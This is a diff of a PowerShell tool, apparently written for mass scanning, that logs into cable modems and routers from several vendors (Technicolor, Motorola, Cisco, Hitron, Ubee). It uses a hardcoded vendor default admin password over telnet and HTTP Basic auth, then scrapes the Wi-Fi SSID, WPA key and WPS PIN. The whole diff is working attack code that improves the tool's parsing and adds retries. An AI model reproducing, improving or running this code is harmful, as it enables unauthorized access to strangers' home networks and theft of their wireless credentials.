@@ -5,8 +5,11 @@ $IPs_FAILED = "$ACTUAL_PATH\Fail.txt";
 
 function verifyFile(){
 	if([System.IO.File]::Exists($save)){
+		$actualIP = Get-Content $save
 		if((Get-Item $save).length -gt 500){
-			(Get-Content $save) -replace '\-', ':' | Set-Content $save;
+			if($actualIP -match '([0-9A-Fa-f]{2}[-]){5}[0-9A-Fa-f]{2}'){
+				$actualIP -replace '\-', ':' | Set-Content $save;
+			}
 		}else{
 			Add-Content -Path "$IPs_FAILED" -Value "$line";
 			Remove-Item $save
@@ -114,8 +117,10 @@ function techTom($ip){
 
 			if(!($PASS -like '*0000000000*')){
 				"$BSSID - $PASS"
+			}else{
+				$BSSID
 			}
-			$BSSID
+			
 			
 		}catch{
 			"Debugging error in Thompson"
@@ -165,12 +170,18 @@ function wan($ip){
 			Get-Telnet -RemoteHost "$ip" -Commands "admin","Uq-4GIt3M","cd wifi","show nvram"
 			$wan = Get-Content $save
 		}
-		
-		$SSID = ($wan | Select-String -Pattern 'wl0_ssid=.*').Line.Replace('wl0_ssid=','')
-		$BSSID = ($wan | Select-String -Pattern 'macaddr=.*').Line.replace('macaddr=','').ToUpper()
-		$PASS = ($wan | Select-String -Pattern 'wl0_wpa_psk=.*').Line.replace('wl0_wpa_psk=','')
-		$PIN = ($wan | Select-String -Pattern 'wps_device_pin=.*').Line.replace('wps_device_pin=','')
-		"$SSID - $BSSID - $PASS"
+		verifyFile
+		try{
+			$SSID = ($wan | Select-String -Pattern 'wl0_ssid=.*').Line.Replace('wl0_ssid=','')
+			$BSSID = ($wan | Select-String -Pattern 'macaddr=.*').Line.replace('macaddr=','').ToUpper()
+			$PASS = ($wan | Select-String -Pattern 'wl0_wpa_psk=.*').Line.replace('wl0_wpa_psk=','')
+			$PIN = ($wan | Select-String -Pattern 'wps_device_pin=.*').Line.replace('wps_device_pin=','')
+			"$SSID - $BSSID - $PASS"
+		}catch{
+			if($wan -like '*Started Unicast Maintenance Ranging*'){
+				Remove-Item $save
+			}
+		}
 	}
 	
 }
@@ -188,12 +199,12 @@ function motorola($ip){
 		if($motorola -like '*Sagemcom*'){
 			$BSSID = ($motorola -match '([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}').split('()')[1].ToUpper()
 			$PASS = (($motorola -match ('name="WpaPreSharedKey" size="*32"* maxlength="*64"* value=".*"')) -split 'value="')[1].split('"')[0]
-			"$SSID - $BSSID - $PASS"
+			"$BSSID - $PASS"
 		}else{
 			$BSSID = ($motorola -match 'colspan=2 bgcolor=#E7DAAC>.*').split('()')[1].Trim()
 			$SSID = ($motorola -match 'colspan=2 bgcolor=#E7DAAC>.*').split('()')[0].replace('<tr><td align=middle valign=top colspan=2 bgcolor=#E7DAAC>','').Trim()
 			$PASS = (($motorola -match 'size=32 maxlength=64 value=".*"') -split 'value="' -split '"></tr><tr>')[1]
-			"$BSSID - $PASS"
+			"$BSSID - $SSID - $PASS"
 		}
 	}
 }
@@ -233,7 +244,33 @@ function ciscoDPC2420($ip){
 	unlockCisco $ip;
 	curl --connect-timeout 3 -m 10 -s -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/webstar.html" -H "Connection: keep-alive" --compressed http://$ip/status.asp  | out-null;
     curl -o $save --connect-timeout 3 -m 60 -s -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/webstar.html" -H "Connection: keep-alive" --compressed http://$ip/status.asp;
-    verifyFile
+	verifyFile
+	try{
+		(Invoke-WebRequest -Uri "http://$ip/status.asp" -Headers @{"Cache-Control"="max-age=0"; "Authorization"="Basic YWRtaW46VXEtNEdJdDNN"; "Upgrade-Insecure-Requests"="1"; "DNT"="1"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"; "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"; "Referer"="http://$ip/status.asp"; "Accept-Encoding"="gzip, deflate"; "Accept-Language"="es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6"}) | out-null
+		(Invoke-WebRequest -Uri "http://$ip/status.asp" -Headers @{"Cache-Control"="max-age=0"; "Authorization"="Basic YWRtaW46VXEtNEdJdDNN"; "Upgrade-Insecure-Requests"="1"; "DNT"="1"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"; "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"; "Referer"="http://$ip/status.asp"; "Accept-Encoding"="gzip, deflate"; "Accept-Language"="es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6"}) | out-null
+		$cisco = (Invoke-WebRequest -Uri "http://$ip/wlanBasic.asp" -Headers @{"Authorization"="Basic YWRtaW46VXEtNEdJdDNN"; "Upgrade-Insecure-Requests"="1"; "DNT"="1"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"; "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"; "Referer"="http://$ip/DprSetup.asp"; "Accept-Encoding"="gzip, deflate"; "Accept-Language"="es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6"}).Content
+		$ciscoPassword = (Invoke-WebRequest -Uri "http://$ip/wlanSecurity.asp" -Headers @{"Authorization"="Basic YWRtaW46VXEtNEdJdDNN"; "Upgrade-Insecure-Requests"="1"; "DNT"="1"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"; "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"; "Referer"="http://$ip/DprSetup.asp"; "Accept-Encoding"="gzip, deflate"; "Accept-Language"="es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6"}).Content
+
+		if($cisco -match '([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}'){
+			$BSSID = $Matches[0]
+			if($cisco -match 'size=32 maxlength=32 value=".*'){
+				$SSID = $Matches[0].replace('size=32 maxlength=32 value="','').replace('">','')
+				#if($ciscoPassword -match 'size=32 maxlength=64 value=.*'){
+				#	$PASS= $Matches[0].replace('size=32 maxlength=64 value=','').split('>')[0]
+				#	"$SSID - $BSSID - $PASS"
+				#}
+				"$SSID - $BSSID"
+			}
+		}
+		
+
+	}catch{
+
+    	"Fail BRO"
+
+	}
+
+	
 }
 
 # Technicolor CGA0101
@@ -244,7 +281,7 @@ function techCGA0101($ip){
 	verifyFile
 	if([System.IO.File]::Exists($save)){
 		$json = ((Get-Content $save | Out-String | ConvertFrom-Json).1).data
-		Write-Output $json.SSID - $json.KeyPassphrase
+		Write-Output $json.SSID.Trim() - $json.KeyPassphrase.Trim()
 	}
 }
 
@@ -271,10 +308,13 @@ function techDPC3928SL2($ip){
 # Hitron CGNV2
 function hitron($ip){
 	Write-Output "=========$ip - Hitron CGNV2=========" 
-	Get-Telnet -RemoteHost "$ip" -Commands "admin","Uq-4GIt3M","wpaKeygetnow","cable" ,"system" ,"ipPrint"
-	verifyFile
+	Get-Telnet -RemoteHost "$ip" -Commands " ", "admin","Uq-4GIt3M","wpaKeygetnow","cable" ,"system" ,"ipPrint"
 	if([System.IO.File]::Exists($save)){
 		$hitron = Get-Content $save
+		if($hitron -like '*Login incorrect*'){
+			Remove-Item $save
+			Get-Telnet -RemoteHost "$ip" -Commands "admin","Uq-4GIt3M","wpaKeygetnow","cable" ,"system" ,"ipPrint"
+		}
 		$BSSID = ($hitron -match 'ra0       Link encap:Ethernet  HWaddr .*' -split 'HWaddr ')[1]
 		$PASS = ($hitron -match 'wpa key is:.*' -split ': ')[1]
 		"$BSSID - $PASS"
@@ -291,15 +331,11 @@ function ubee($ip){
 
 	if([System.IO.File]::Exists($save)){
 		$ubee = Get-Content $save
-		$SSID = ($ubee -match '([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})').replace('<tr><td align=middle valign=top>','').split('(')[0].Trim()
-		$BSSID = ($ubee -match '([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})').split('()')[1].Trim()
-		$PASS = (($ubee -match ('name="WpaPreSharedKey" size="*32"* maxlength="*64"* value=".*"')) -split 'value="')[1].split('"')[0]
+		$SSID = ($ubee | Select-String -Pattern  '([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})').replace('<tr><td align=middle valign=top>','').split('(')[0].Trim()
+		$BSSID = ($ubee | Select-String -Pattern  '([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})').split('()')[1].Trim()
+		$PASS = (($ubee | Select-String -Pattern  ('name="WpaPreSharedKey" size="*32"* maxlength="*64"* value=".*"')) -split 'value="')[1].split('"')[0]
 		"$BSSID - $SSID - $PASS"
 	}
-		
-
-
-
 }
 
 #Ubee sin DOCSIS
